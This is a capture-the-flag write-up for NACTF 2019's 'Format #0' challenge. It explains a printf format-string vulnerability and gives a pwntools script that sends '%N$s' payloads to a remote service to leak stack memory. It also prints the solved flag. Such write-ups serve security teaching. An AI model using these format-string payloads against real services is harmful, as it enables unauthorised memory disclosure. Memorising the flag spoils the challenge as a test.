# Format #0
Points: 200

## Category
Binary Exploitation

## Question
>Someone didn't tell Chaddha not to give user input as the first argument to printf() - use it to leak the flag!

>Connect at shell.2019.nactf.com:31782

### Hint
>Note the f in printf

## Solution
When we see printf statment, it is usually a format string attack. Read more at [here](https://www.owasp.org/index.php/Format_string_attack).

In short, input %s to perform string conversion
%s%s%s%s%s == %5$s as a shortcut. 

We just have to print enough value on the stack until we can get the flag. 

Since we do not know how many number of stacks we have to go through, We can write a simple python script to keep interating up the stack until we find it.
```python
from pwn import *

host, port = 'shell.2019.nactf.com', 31782
for i in range(25):
	s = connect(host,port)
	s.recvuntil('Type something>')
	s.sendline('%' + str(i) + '$s')
	print('%' + str(i) + '$s')

	response = s.recv()
	print(response)
	s.close
```

Print the 24th value in the stacks to get the flag.

### Flag
`nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}`
